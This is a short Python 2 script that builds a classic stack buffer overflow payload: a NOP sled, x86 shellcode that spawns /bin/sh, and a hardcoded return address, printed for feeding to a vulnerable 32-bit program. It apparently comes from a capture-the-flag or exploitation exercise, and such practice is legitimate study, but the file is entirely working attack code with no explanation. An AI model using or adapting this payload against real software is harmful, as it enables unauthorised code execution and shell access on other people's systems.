#!/usr/bin/env python2
import struct

p32 = lambda x: struct.pack("<I", x)

eip = 0xffffd850

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

overflow = "\x90" * (132 - len(shellcode)) + (shellcode) + p32(eip)

# print(len(shellcode))

print (overflow)
